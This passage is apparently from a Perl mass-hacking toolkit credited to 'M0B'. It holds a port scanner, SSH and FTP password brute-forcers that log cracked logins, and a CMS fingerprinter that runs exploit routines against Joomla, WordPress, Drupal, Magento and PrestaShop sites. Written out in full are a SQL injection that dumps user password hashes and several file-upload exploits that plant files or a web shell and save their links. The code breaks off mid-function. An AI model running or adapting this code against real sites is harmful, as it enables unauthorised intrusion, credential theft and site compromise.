elsif($checar =~/#170-Ubuntu SMP|UTC 2017 x86_64|.el6.x86_64 #1 SMP|EDT 2017 x86_64|.el7.x86_64 #1 SMP|UTC 2016 x86_64|.el6h.x86_64 #1 SMP|EDT 2017 x86_64|#1 SMP |CDT 2017 x86_64|wp-cron.php|wp-config.php|wp-content|.ELK6.x86_64 #1 SMP|CDT 2017 x86_64|.el6h.x86_64 #1 SMP|EDT 2017 x86_64|Linux|Windows|Ubunto|Debian|#1 SMP|MSK 2017 x86_64|.hostgator.com|.bluehost.com|.justhost.com|.myserverhosts.com|.sgcentos.com|.websitewelcome.com|.secureserver.net|UTC 2015 x86_64|CDT 2016 x86_64|CST 2016 x86_64|UTC 2016 x86_64|EDT 2016 x86_64|MSK 2016|CDT 2014 x86_64|CST 2014 x86_64|UTC 2014 x86_64|EDT 2014 x86_64|MSK 2014|CDT 2015 x86_64|CST 2015 x86_64|UTC 2015 x86_64|EDT 2015 x86_64|MSK 2015|CDT 2013 x86_64|CST 2013 x86_64|UTC 2013 x86_64|EDT 2013 x86_64|MSK 2013|(Windows Server 2008 Enterprise Edition Service Pack 2)/) {
    print colored("[MAYBE SHELL]: $site",'WHITE ON_yellow'),"\n";
open(save, '>>Result/maybe_shell.txt');
    print save "$site\n";
    close(save);
}
elsif($checar =~/1337w0rm|cPanel Cracker|Automatic cPanel Finder|cpanel cracker 3xp1r3 cyber army/) {
    print colored("[CPANEL CRACKER]: $site",'WHITE ON_purple'),"\n";
open(save, '>>Result/cpanel.txt');
    print save "$site\n";
    close(save);
}
elsif($checar =~/HACKED BY|hacked by|Hacked|Hacked|Hacked by|0wn3d By|Security is Captured By/) {
    print colored("[HACKED INDEX]: $site",'WHITE ON_red'),"\n";
open(save, '>>Result/hacked_index.txt');
    print save "$site\n";
    close(save);
}
else{
   print colored("[UNKNOWN]: $site",'BOLD WHITE'),"\n";
   open(save, '>>Result/nothing_found.txt');
   print save "$site\n";
   close(save);
}
}

sub ipbr() {
use Net::SSH::Expect;
use Net::OpenSSH;
use Net::FTP;
system("clear");
print $oni[rand @oni];
print colored("$are[rand @are]",'blue');
print "\n";
print colored("+------------------------------------------------------------------------+",'red'),"\n";
print colored("[+]shell finder created by M0B",'red'),"\n";
print colored("[-]WARNING: I don't take any responsability to use this tool for bypass",'blue'),"\n";
print colored("[-]WARNING: this is ip scanner tool + brute force",'blue'),"\n";
print colored("+------------------------------------------------------------------------+",'red'),"\n";
print "\n";
 
########## PART WORK #################
print colored("[PUT YOUR LIST]: ",'red');
 
$lista=<STDIN>;
chomp($lista);
print "\n";
open (lista, "<$lista") || die "\n [LIST NOT FOUND]";
my @lista = <lista>;
close lista;
$pass = "passwords.txt";
foreach $site(@lista) {
 
if($site !~ /http:\/\//) { $site = "$site"; };
ipscan();
}

sub ipscan() {
  delete @ENV { PATH };

  my ($ponto,$porta);
  
  ($ponto = $site) || &uso();

  # utilizei alguns servicos simples. Se quiser mudar, implementar uma leitura de arquivo, va em frente 
  my %conectado = split /:/, 
  "ftp:21:ssh:22:smtp:25:http:80:www:80:www-http:80:https:443:cpanel:2082";

  %conectado = reverse %conectado;

  my @portas = sort por_numero keys %conectado;


  ### Principal
  &config($site);
  &comeca_festa;
  
  ###


  ### Funcoes 
  
sub comeca_festa {
  my $nportas = 0;
  foreach $porta (@portas) {
	# cria socket
    $sock = IO::Socket::INET->new("$ponto:$porta");
	
	# se sock, entao imprima dados
	
	if($sock) {
  	  print "Port $porta\t$conectado{$porta}\n";
	  $nportas++;
if($porta eq '21'){
open(save, '>>Result/ftp.txt');
    print save "$ponto\n";
ftp();
ftp2();
}
if($porta eq '22'){
open(save, '>>tmp/ssh.txt');
    print save "$ponto\n";
ssh();
}
if($porta eq '80'){
open(save, '>>tmp/http.txt');
    print save "$ponto\n";
}
if($porta eq '443'){
print("server with ssl");
open(save, '>>tmp/https.txt');
    print save "$ponto\n";
}
if($porta eq '2082'){
open(save, '>>tmp/cpanel.txt');
    print save "$ponto\n";
}
	}
  }
  
  # finaliza
  print "\n\n$nportas opened in $ponto\n";
}

# configura titulo, e limpa a tela
sub config {

  system("clear");

  my $titulo = "PORTSCANNER - ";
  $titulo = $titulo.$_[0];

  print colored ("=" x length($titulo),'blue');
  print "\n";
  printf("%s\n", $titulo);
  print colored ("=" x length($titulo),'blue');
  print "\n";
}


# funcao que ordena um hash de valores
sub por_numero {
    if ( $a < $b ) { -1 }
    elsif ( $a > $b ) { 1 }
    else { 0 }
}
sub ssh() {
my $host= $site;
my $user="root";
my $wl='passwords.txt';
main();
sub main(){
print colored("STARTING HARD WORK :) SSH\n",'white on_green');
print BOLD BLUE, "\n\n[*] ",RESET,"Attacking: $host\n",BOLD BLUE,"[*]",RESET," Username: $user\n\n";
open(my $words,"<$wl") or die("$!");
while (<$words>){
chomp($_);
print BOLD BLUE, "[*] ",RESET,"Testando senha:$_\n";
if((&authssh($_)) == 0){
print BOLD RED, "[-] ",RESET,"ERROR\n";
} else {
print GREEN, "\n\t[+] ",RESET,"Password Cracked: $_\n\n";
open (TEXT, '>>Result/ssh.txt');
print TEXT "host:$host:21 user:$user pass:$_\n";
}
}
}

sub authssh(){
my $f = Net::OpenSSH->new($host) or die "$!";
if(!$f->login($user, $_)){
$f->quit;
return 0;
} else {
return 1;
}
}
}
sub ftp() {
my $host = $site;
my $usuario = "ftp";
my $wordlist = "passwords.txt";
print colored("STARTING HARD WORK :) FTP\n",'white on_green');
print "[*]HOST: $host\n[*] USER: $usuario\n\n";
 
open(a,"<$wordlist");
@senhas = <a>;
$b = scalar(@senhas);
for($a>0;$a<$b;$a++){
 
$numero += 1;
chomp($senha2 = $senhas[$a]);
my $f = Net::FTP->new($host) or die "$!";
if(!$f->login($usuario, $senha2)){
print "[*] $host:21 - [$numero/$b] TRYING... $senha2\n";
$f->quit;
} else {
print "[*] $host:21 - [$numero/$b] TRYING... $senha2\n";
print "[+] $host -FTP CRACKER !\n";
print "[*] Login: $usuario Senha: $senha2\n\n";
open (TEXT, '>>ftp.txt');
print TEXT "host:$host:21 user:$usuario pass:$senha2\n";
}
 
}
print colored ("[-] PASSWORD LIST NOT FOUND / BRUTE FORCE FINISHED WITHOUT FOUNDING GOOD PASSWORD :/\n",'white on_red');
}
sub ftp2() {

my $host= $site;
my $user="admin";
my $wl='passwords.txt';
main();
sub main(){
print colored("STARTING HARD WORK :) FTP 2\n",'white on_green');
print BOLD BLUE, "\n\n[*] ",RESET,"Attacking: $host\n",BOLD BLUE,"[*]",RESET," Username: $user\n\n";
open(my $words,"<$wl") or die("$!");
while (<$words>){
chomp($_);
print BOLD BLUE, "[*] ",RESET,"Testando senha:$_\n";
if((&auth($_)) == 0){
print BOLD RED, "[-] ",RESET,"ERROR\n";
} else {
print GREEN, "\n\t[+] ",RESET,"Password Cracked: $_\n\n";
open (TEXT, '>>Result/ftp.txt');
print TEXT "host:$host:21 user:$user pass:$_\n";
}
}
}
sub auth(){
my $f = Net::FTP->new($host) or die "$!";
if(!$f->login($user, $_)){
$f->quit;
return 0;
} else {
return 1;
}
}
}

sub ip() {
system("clear");
print $oni[rand @oni];
print colored("$are[rand @are]",'blue');
print colored("[PUT THE IP YOU WANT TO SCAN]: ",'red');
 
  delete @ENV { PATH };
$ip=<STDIN>;
chomp($ip);
  my ($ponto,$porta);
  
  ($ponto = $ip) || &uso();

  # utilizei alguns servicos simples. Se quiser mudar, implementar uma leitura de arquivo, va em frente 
  my %conectado = split /:/, 
  "tcpmux:1:compressnet:2:compressnet:3:rje:5:echo:7:discard:9:systat:11:daytime:13:qotd:17:msp:18:chargen:19:ftp-data:20:ftp:21:ssh:22:telnet:23:smtp:25:nsw-fe:27:msg-icp:29:msg-auth:31:dsp:33:time:37:rap:38:rlp:39:graphics:41:name:42:nameserver:42:nicname:43:mpm-flags:44:mpm:45:mpm-snd:46:ni-ftp:47:auditd:48:tacacs:49:re-mail-ck:50:la-maint:51:xns-time:52:domain:53:xns-ch:54:isi-gl:55:xns-auth:56:xns-mail:58:ni-mail:61:acas:62:whois++:63:covia:64:tacacs-ds:65:sql*net:66:bootps:67:bootpc:68:tftp:69:gopher:70:netrjs-1:71:netrjs-2:72:netrjs-3:73:netrjs-4:74:deos:76:vettcp:78:finger:79:http:80:www:80:www-http:80:hosts2-ns:81:xfer:82:mit-ml-dev:83:ctf:84:mit-ml-dev:85:mfcobol:86:kerberos:88:su-mit-tg:89:dnsix:90:mit-dov:91:npp:92:dcp:93:objcall:94:supdup:95:dixie:96:swift-rvf:97:tacnews:98:metagram:99:newacct:100:hostname:101:gppitnp:103:cso:105:csnet-ns:105:3com-tsmux:106:rtelnet:107:snagas:108:pop-3:110:sunrpc:111:mcidas:112:ident:113:auth:113:audionews:114:sftp:115:ansanotify:116:uucp-path:117:sqlserv:118:nntp:119:cfdptkt:120:erpc:121:smakynet:122:ntp:123:ansatrader:124:locus-map:125:nxedit:126:locus-con:127:gss-xlicen:128:pwdgen:129:cisco-fna:130:cisco-tna:131:cisco-sys:132:statsrv:133:ingres-net:134:epmap:135:profile:136:netbios-ns:137:netbios-dgm:138:netbios-ssn:139:emfis-data:140:emfis-cntl:141:bl-idm:142:imap:143:uma:144:uaac:145:iso-ip:147:jargon:148:aed-512:149:sql-net:150:hems:151:bftp:152:sgmp:153:netsc-prod:154:netsc-dev:155:sqlsrv:156:knet-cmp:157:pcmail-srv:158:nss-routing:159:sgmp-traps:160:snmp:161:snmptrap:162:cmip-man:163:cmip-agent:164:xns-courier:165:s-net:166:namp:167:rsvd:168:send:169:print-srv:170:multiplex:171:xyplex-mux:173:mailq:174:vmnet:175:genrad-mux:176:xdmcp:177:nextstep:178:bgp:179:ris:180:unify:181:audit:182:ocbinder:183:ocserver:184:remote-kis:185:kis:186:aci:187:mumps:188:qft:189:gacp:190:prospero:191:osu-nms:192:srmp:193:irc:194:dn6-nlm-aud:195:dn6-smm-red:196:dls:197:dls-mon:198:smux:199:src:200:at-rtmp:201:at-nbp:202:at-3:203:at-echo:204:at-5:205:at-zis:206:at-7:207:at-8:208:qmtp:209:anet:212:ipx:213:vmpwscs:214:softpc:215:CAIlic:216:dbase:217:mpp:218:uarps:219:fln-spx:221:rsh-spx:222:cdc:223:masqdialer:224:direct:242:sur-meas:243:dayna:244:link:245:dsp3270:246:subntbcst_tftp:247:bhfhs:248:rap:256:set:257:yak-chat:258:esro-gen:259:openport:260:nsiiops:261:arcisdms:262:hdap:263:bgmp:264:http-mgmt:280:personal-link:281:cableport-ax:282:rescap:283:corerjd:284:novastorbakcup:308:entrusttime:309:bhmds:310:asip-webadmin:311:vslmp:312:magenta-logic:313:opalis-robot:314:dpsi:315:decauth:316:zannet:317:pkix-timestamp:318:ptp-event:319:ptp-general:320:pip:321:rtsps:322:pdap:344:pawserv:345:zserv:346:fatserv:347:csi-sgwp:348:mftp:349:matip-type-a:350:matip-type-b:351:bhoetty:351:dtag-ste-sb:352:bhoedap4:352:ndsauth:353:datex-asn:355:bhevent:357:shrinkwrap:358:tenebris_nts:359:scoi2odialog:360:semantix:361:srssend:362:rsvp_tunnel:363:aurora-cmgr:364:dtk:365:odmr:366:mortgageware:367:qbikgdp:368:rpc2portmap:369:clearcase:371:ulistproc:372:legent-1:373:legent-2:374:hassle:375:nip:376:tnETOS:377:dsETOS:378:is99c:379:is99s:380:hp-collector:381:hp-managed-node:382:hp-alarm-mgr:383:arns:384:ibm-app:385:asa:386:aurp:387:ldap:389:uis:390:synotics-relay:391:synotics-broker:392:dis:393:embl-ndt:394:netcp:395:netware-ip:396:mptn:397:kryptolan:398:iso-tsap-c2:399:work-sol:400:ups:401:genie:402:decap:403:nced:404:ncld:405:imsp:406:timbuktu:407:prm-sm:408:prm-nm:409:decladebug:410:rmt:411:synoptics-trap:412:smsp:413:infoseek:414:bnet:415:silverplatter:416:onmux:417:hyper-g:418:ariel1:419:smpte:420:ariel2:421:ariel3:422:opc-job-start:423:opc-job-track:424:icad-el:425:smartsdp:426:svrloc:427:ocs_cmu:428:ocs_amu:429:utmpsd:430:utmpcd:431:iasd:432:nnsp:433:mobileip-agent:434:mobilip-mn:435:dna-cml:436:comscm:437:dsfgw:438:dasp:439:sgcp:440:decvms-sysmgt:441:cvc_hostd:442:https:443:snpp:444:microsoft-ds:445:ddm-rdb:446:ddm-dfm:447:ddm-ssl:448:as-servermap:449:tserver:450:sfs-smp-net:451:sfs-config:452:creativeserver:453:contentserver:454:creativepartnr:455:macon-tcp:456:scohelp:457:appleqtc:458:ampr-rcmd:459:skronk:460:datasurfsrv:461:datasurfsrvsec:462:alpes:463:kpasswd:464:digital-vrc:466:mylex-mapd:467:photuris:468:rcp:469:scx-proxy:470:mondex:471:ljk-login:472:hybrid-pop:473:tcpnethaspsrv:475:ss7ns:477:spsc:478:iafserver:479:iafdbase:480:ph:481:bgs-nsi:482:ulpnet:483:integra-sme:484:powerburst:485:avian:486:saft:487:gss-http:488:nest-protocol:489:micom-pfs:490:go-login:491:ticf-1:492:ticf-2:493:pov-ray:494:intecourier:495:pim-rp-disc:496:dantz:497:siam:498:iso-ill:499:isakmp:500:stmf:501:asa-appl-proto:502:intrinsa:503:citadel:504:mailbox-lm:505:ohimsrv:506:crs:507:xvttp:508:snare:509:fcp:510:passgo:511:exec:512:login:513:shell:514:printer:515:videotex:516:talk:517:ntalk:518:utime:519:efs:520:ripng:521:ulp:522:ncp:524:timed:525:tempo:526:stx:527:custix:528:irc-serv:529:courier:530:conference:531:netnews:532:netwall:533:mm-admin:534:iiop:535:opalis-rdv:536:nmsp:537:gdomap:538:apertus-ldp:539:uucp:540:uucp-rlogin:541:commerce:542:klogin:543:kshell:544:appleqtcsrvr:545:dhcpv6-client:546:dhcpv6-server:547:afpovertcp:548:idfp:549:new-rwho:550:cybercash:551:deviceshare:552:pirp:553:rtsp:554:dsf:555:remotefs:556:openvms-sysipc:557:sdnskmp:558:teedtap:559:rmonitor:560:monitor:561:chshell:562:nntps:563:9pfs:564:whoami:565:streettalk:566:banyan-rpc:567:ms-shuttle:568:ms-rome:569:meter:570:meter:571:sonar:572:banyan-vip:573:ftp-agent:574:vemmi:575:ipcd:576:vnas:577:ipdd:578:decbsrv:579:sntp-heartbeat:580:bdp:581:scc-security:582:philips-vc:583:keyserver:584:imap4-ssl:585:password-chg:586:submission:587:cal:588:eyelink:589:tns-cml:590:http-alt:591:eudora-set:592:http-rpc-epmap:593:tpip:594:cab-protocol:595:smsd:596:ptcnameservice:597:acp:599:ipcserver:600:urm:606:nqs:607:sift-uft:608:npmp-trap:609:npmp-local:610:npmp-gui:611:hmmp-ind:612:hmmp-op:613:sshell:614:sco-inetmgr:615:sco-sysmgr:616:sco-dtmgr:617:dei-icda:618:digital-evm:619:sco-websrvrmgr:620:escp-ip:621:collaborator:622:aux_bus_shunt:623:cryptoadmin:624:dec_dlm:625:asia:626:passgo-tivoli:627:qmqp:628:rda:630:ipp:631:bmpp:632:servstat:633:ginad:634:rlzdbase:635:ldaps:636:lanserver:637:mcns-sec:638:msdp:639:entrust-sps:640:repcmd:641:sanity:643:dwr:644:pssc:645:ldp:646:dhcp-failover:647:rrp:648:aminet:649:obex:650:ieee-mms:651:udlr-dtcp:652:repscmd:653:aodv:654:tinc:655:spmp:656:rmc:657:tenfold:658:url-rendezvous:659:mac-srvr-admin:660:hap:661:pftp:662:purenoise:663:mdqs:666:doom:666:disclose:667:mecomm:668:meregister:669:vacdsm-sws:670:vacdsm-app:671:vpps-qua:672:cimplex:673:acap:674:dctp:675:vpps-via:676:vpp:677:ggf-ncp:678:mrm:679:entrust-aaas:680:entrust-aams:681:xfr:682:corba-iiop:683:corba-iiop-ssl:684:mdc-portmapper:685:hcp-wismar:686:asipregistry:687:realm-rusd:688:elcsd:704:agentx:705:borland-dsj:707:entrust-kmsh:709:entrust-ash:710:cisco-tdp:711:netviewdm1:729:netviewdm2:730:netviewdm3:731:netgw:741:netrcs:742:flexlm:744:fujitsu-dev:747:ris-cm:748:kerberos-adm:749:rfile:750:pump:751:qrh:752:rrh:753:tell:754:nlogin:758:con:759:ns:760:rxe:761:quotad:762:cycleserv:763:omserv:764:webster:765:phonebook:767:vid:769:cadlock:770:rtip:771:cycleserv2:772:submit:773:rpasswd:774:entomb:775:wpages:776:multiling-http:777:wpgs:780:concert:786:qsc:787:mdbs_daemon:800:device:801:fcp-udp:810:itm-mcell-s:828:pkix-3-ca-ra:829:rsync:873:iclcnet-locate:886:iclcnet_svinfo:887:accessbuilder:888:cddbp:888:omginitialrefs:900:xact-backup:911:ftps-data:989:ftps:990:nas:991:telnets:992:imaps:993:ircs:994:pop3s:995:vsinet:996:maitrd:997:busboy:998:garcon:999:puprouter:999:cadlock:1000:surf:1010:raserver:4000:cpanel:2082";

  %conectado = reverse %conectado;

  my @portas = sort por_numero keys %conectado;


  ### Principal
  &config($ip);
  &comeca_festa;
  exit;  
  ###


  ### Funcoes 
  
sub comeca_festa {
  my $nportas = 0;
  foreach $porta (@portas) {
	# cria socket
    $sock = IO::Socket::INET->new("$ponto:$porta");
	
	# se sock, entao imprima dados
	
	if($sock) {
  	  print "Port $porta\t$conectado{$porta}\n";
	  $nportas++;

	}
  }
  
  # finaliza
  print "\n\n$nportas opened in $ponto\n";
}

# configura titulo, e limpa a tela
sub config {

  system("clear");

  my $titulo = "PORTSCANNER - ";
  $titulo = $titulo.$_[0];

  print colored ("=" x length($titulo),'blue');
  print "\n";
  printf("%s\n", $titulo);
  print colored ("=" x length($titulo),'blue');
  print "\n";
}


# funcao que ordena um hash de valores
sub por_numero {
    if ( $a < $b ) { -1 }
    elsif ( $a > $b ) { 1 }
    else { 0 }
}

sub bot() {
use IO::Select;
use HTTP::Response;
use HTTP::Request::Common qw(GET);
use URI::URL;
use IO::Socket::INET;
use Term::ANSIColor qw(:constants);
use MIME::Base64;
use LWP;
use HTTP::Cookies;
use HTML::Entities;
use URI::Escape;
use Term::ANSIColor;
use LWP::UserAgent;
use HTTP::Request;
use HTTP::Request::Common qw(POST);
use LWP::UserAgent;
use HTTP::Request::Common;
use Term::ANSIColor;
use HTTP::Request::Common qw(GET);
$ag = LWP::UserAgent->new();
use MIME::Base64;
use Getopt::Long;
use HTTP::Request;
use LWP::UserAgent;
use IO::Select;
use HTTP::Cookies;
use HTTP::Response;
use Term::ANSIColor;
use HTTP::Request::Common qw(POST);
use HTTP::Request::Common qw(GET);
use URI::URL;
use IO::Socket::INET;
my $ua = LWP::UserAgent->new;
$ua->timeout(10);
system("clear");
print $oni[rand @oni];
print colored("$are[rand @are]",'blue');
print colored("+------------------------------------------------------------------------+",'red'),"\n";
print colored("[+]EXPLOIT BY M0B INCLUDING NEW EXPLOITS",'red'),"\n";
print colored("[-]WARNING: I don't take any responsability to use this tool for bypass",'blue'),"\n";
print colored("[-]WARNING: DONT FORGET GIVE A THANKS ORIGINAL CREATORS :)",'blue'),"\n";
print colored("+------------------------------------------------------------------------+",'red'),"\n";
############## let me be a hero :)
########## start work :)
print colored("PUT YOUR LIST AND WAIT FOR IT\n",'blue');
print colored("[PUT YOUR LIST]: ",'red');
$liste=<STDIN>;
chomp($liste);
print "\n";
open (liste, "<$liste") || die "\n [LIST NOT FOUND]";
my @liste = <liste>;
close liste;
foreach $site(@liste) {
 
if($site !~ /http:\/\//) { $site = "http://$site/"; };
cmscheck();
}
sub cmscheck($site){
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
$ua->timeout (8);
$lokomedia = "$site/smiley/1.gif";
my $lokomediacms = $ua->get("$lokomedia")->content_type;
$loko = "$site/rss.xml";
my $lokomediacmstow = $ua->get("$loko")->content;
my $cms = $ua->get("$site")->content;
################ you're going to notice that i have added some other cms like ModX or XOOPS .... waiting for finding their exploits
if($cms =~/<script type=\"text\/javascript\" src=\"\/media\/system\/js\/mootools.js\"><\/script>| \/media\/system\/js\/|com_content|Joomla!/) {
print color('bold white'),"\n$site ";
    print color("bold blue"), "[JOOMLA]\n\n";
    print color('reset');
    open(save, '>>tmp/joomla.txt');
    print save "$site\n";   
    close(save);
com_ewriting();
comjce();
comedia();
comjdownloads();
comfabrik();
comfabrik2();
foxcontact();
comadsmanager();
comblog();
comusers();
comweblinks();
mod_simplefileupload();
}
elsif($cms =~/wp-content|wordpress|xmlrpc.php/) {
    print color('bold white'),"\n$site ";
    print color("bold green"), "[WORDPRESS]\n\n"; 
    print color('reset'); 
    open(save, '>>tmp/Wordpress.txt');
    print save "$site\n"; 
    close(save);
    levoslideshow();
    addblockblocker();
    blaze();
    catpro();
    cherry();
    downloadsmanager();
    formcraft();
    powerzoomer();
    gravityforms();
    revslider();
    getconfig();
    getconfig1();
    showbiz();
    ads();
    slideshowpro();
    wpmobiledetector();
    wysija();
    inboundiomarketing();
    dzszoomsounds();
    reflexgallery();
    sexycontactform();
    wtffu();
    wpjm();
    phpeventcalendar();
    synoptic();
    Wpshop();
    wpinjection();
    Wordpress_Themes();
}
elsif($cms =~/Drupal|drupal|sites\/all|drupal.org/) {
    print color('bold white'),"\n$site ";
    print color("bold yellow"), "[DRUPAL]\n\n";
    print color('reset');
    open(save, '>>tmp/drupal.txt');
    print save "$site\n";   
    close(save);
drupal();
}
elsif($cms =~/\/faq.php\/vb|\/forum\/|Powered by vbulletin/) {
    print color('bold white'),"\n$site ";
    print color("bold red"), "[vBULLETIN]\n\n";
    print color('reset');
    open(save, '>>tmp/vbulletin.txt');
    print save "$site\n";   
    close(save);
vbulletin();
}
elsif($cms =~/route=product|OpenCart|route=common|catalog\/view\/theme/) {
  print "$site ";  
   print color("bold white"), "[OpenCart]\n\n";     print color('reset');

open(save, '>>tmp/OpenCart.txt');
    print save "$site\n";
    close(save);
    }
    elsif($cms =~/(.*)Powered by <a href="http:\/\/www.phpbb.com\/">phpBB<\/a>(.*)/) {
  print "$site ";  
   print color("bold white"), "[phpBB]\n\n";     print color('reset');

open(save, '>>tmp/phpBB.txt');
    print save "$site\n";
    close(save);
    }
        elsif($cms =~/Powered By <a href="http:\/\/www.mybboard.net" target="_blank">MyBB<\/a>/) {
  print "$site ";  
   print color("bold white"), "[MyBB]\n\n";     print color('reset');

open(save, '>>tmp/phpBB.txt');
    print save "$site\n";
    close(save);
    }
    elsif($cms =~/<a href="http:\/\/www.modx.com" target="_blank"> Powered by MODx<\/a>/) {
  print "$site ";  
   print color("bold white"), "[MODx]\n\n";     print color('reset');

open(save, '>>tmp/ModX.txt');
    print save "$site\n";
    close(save);
    }
    elsif($cms =~/<meta name="generator" content="XOOPS" \/>/) {
  print "$site ";  
   print color("bold white"), "[XOOPS]\n\n";     print color('reset');

open(save, '>>tmp/XOOPS.txt');
    print save "$site\n";
    close(save);
    }
        elsif($cms =~/<meta name="generator" content="PostNuke (.*) - http:\/\/postnuke.com">/) {
  print "$site ";  
   print color("bold green"), "[PostNuke]\n\n";     print color('reset');

open(save, '>>tmp/PostNuke.txt');
    print save "$site\n";
    close(save);
postnuke();
    }
        elsif($cms =~/<a href="http:\/\/www.simplemachines.org\/" title="Simple Machines Forum" target="_blank">Powered by SMF (.*)<\/a>/) {
  print "$site ";  
   print color("bold white"), "[SMF]\n\n";     print color('reset');

open(save, '>>tmp/SMF.txt');
    print save "$site\n";
    close(save);
    }
elsif($cms =~/Log into Magento Admin Page|Magento|powered by magento|name=\"dummy\" id=\"dummy\"|Site magento|index.php\customer\account\|skin\frontend\|powered by webforms/) {
    print color('bold white'),"\n$site ";
    print color("bold red"), "[Magento]\n\n";
    print color('reset');
    open(save, '>>tmp/magento.txt');
    print save "$site\n";   
    close(save);
magento();
}
elsif($cms =~/Prestashop|prestashop/) {
    print color('bold white'),"\n$site ";
    print color("bold blue"), "[Prestashop]\n\n";
    print color('reset');
    open(save, '>>tmp/Prestashop.txt');
    print save "$site\n";   
    close(save);
columnadverts();
soopamobile();
soopabanners();
vtermslideshow();
simpleslideshow();
productpageadverts();
homepageadvertise();
homepageadvertise2();
jro_homepageadvertise();
attributewizardpro();
oneattributewizardpro();
attributewizardproOLD();
attributewizardpro_x();
advancedslider();
cartabandonmentpro();
cartabandonmentproOld();
videostab();
wg24themeadministration();
fieldvmegamenu();
wdoptionpanel();
pk_flexmenu();
pk_vertflexmenu();
nvn_export_orders();
megamenu();
tdpsthemeoptionpanel();
psmodthemeoptionpanel();
masseditproduct();
}

elsif($lokomediacms =~/image\/gif/) {
print color('bold white'),"\n$site ";
    print color("bold green"), "[Lokomedia]\n\n";
    print color('reset');
    open(save, '>>tmp/lokomedia.txt');
    print save "$site\n";   
    close(save);
    lokomedia();
}
elsif($lokomediacmstow =~/lokomedia/) {
print color('bold white'),"\n$site ";
    print color("bold green"), "[Lokomedia]\n\n";
    print color('reset');
    open(save, '>>tmp/lokomedia.txt');
    print save "$site\n";   
    close(save);
    lokomedia();
}

else{
print color('bold white'),"\n$site ";
    print color("bold green"), "[IDK]\n\n"; 
    open(save, '>>tmp/Unknown.txt');
    print color('reset'); 
    print save "$site\n";   
    close(save);
}
}
###################
#########JOOMLA
############ com_ewriting
sub com_ewriting() {
	$code="UNION+ALL+SELECT+1,2,concat(username,0x3a,password),4,5,6,7,8,9,10+FROM+"+pre+"_users--;";
$agent = LWP::UserAgent->new() or die "[!] Error while processing";
$agent->agent('Mozilla/5.0 (Windows NT 6.1; WOW64; rv:7.0.1) Gecko/20100101 Firefox/7.0.12011');
$host= $site. "/index.php?option=com_ewriting&Itemid=9999&func=selectcat&cat=-1==".$code;
$ok = $agent->request(HTTP::Request->new(GET=>$host));
$ok1 = $ok->content; if ($ok1 =~/([0-9a-fA-F]{32})/){
print "[+] Password found --> "; print colored("$1\n$2\n",'green');
    open(save, '>>Result/joomlapass.txt');   
    print save "$site $1\n$2\n";   
sleep 1;
}

############# Com Jce
sub comjce(){
$ua = LWP::UserAgent->new();
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout(15);


my $jceurl="$site/index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form&cid=20";

my $res = $ua->post($jceurl,
    Content_Type => 'form-data',
    Content => [
        'upload-dir' => './../../',
        'upload-overwrite' => 0,
        'Filedata' => ["m.gif"],
        'action' => 'upload'
        ]
    )->decoded_content;

$remote = IO::Socket::INET->new(
        Proto=>'tcp',
        PeerAddr=>"$site",
        PeerPort=>80,
        Timeout=>15
        );
$jceup= "$site/m.gif";
$check = $ua->get($jceup)->status_line;
if ($check =~ /200/){
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Com Jce";
print color('bold green'),"[VULNERABLE]\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Picture Uploaded Successfully\n";
print color('bold white'),"  [Link] => $jceup\n";
open (TEXT, '>>Result/index.txt');
print TEXT "$jceup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Com Jce";
print color('bold red'),"[FAILED]\n";
}
}
############## Com Media
sub comedia(){
my $url = "$site/index.php?option=com_media&view=images&tmpl=component&fieldid=&e_name=jform_articletext&asset=com_content&author=&folder=";
my $index ="mob.txt";
my $field_name = "Filedata[]";

my $response = $ua->post( $url,
            Content_Type => 'form-data',
            Content => [ $field_name => ["$index"] ]
           
            );

$mediaup="$site/images/mob.txt";

$checkpofwup = $ua->get("$mediaup")->content;
if($checkpofwup =~/FUCK/) {
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Com Media";
print color('bold green'),"[VULNERABLE]\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"File Uploaded Successfully\n";
print color('bold white'),"  [Link] => $mediaup\n";
open (TEXT, '>>Result/index.txt');
print TEXT "$mediaup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Com Media";
print color('bold red'),"[FAILED]\n";
}
}

################ comjdownloads
sub comjdownloads(){
$file="this.zip";
$filez="l.php.php.j";
$jdup= $site . 'index.php?option=com_jdownloads&Itemid=0&view=upload';
$shellpath= $site . '/images/jdownloads/screenshots/l.php.j?X=M0B';

my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$ua->timeout(10);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");

my $exploit = $ua->post("$jdup", Cookie => "", Content_Type => "form-data", Content => [ name=>"M0B", mail=>"M0B\@gmail.com", filetitle =>"M0B", catlist=>"1", license=>"0", language=>"0", system=>"0",file_upload=>["$file"], pic_upload=>["$filez"], description=>"<p>zot</p>", senden=>"Send file", option=>"com_jdownloads", view=>"upload", send=>"1", "24c22896d6fe6977b731543b3e44c22f"=>"1"]);

my $checkshell = $ua->get("$shellpath")->content;
if($checkshell =~/M0B/) {
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Com Jdownloads";
print color('bold green'),"[VULNERABLE]\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $shellpath\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$shellpath\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Com Jdownloads";
print color('bold red'),"[FAILED]\n";
}
}
################ comjdownloads index
sub comjdownloadsdef(){
$def = $site . '/images/jdownloads/screenshots/l.html.j';
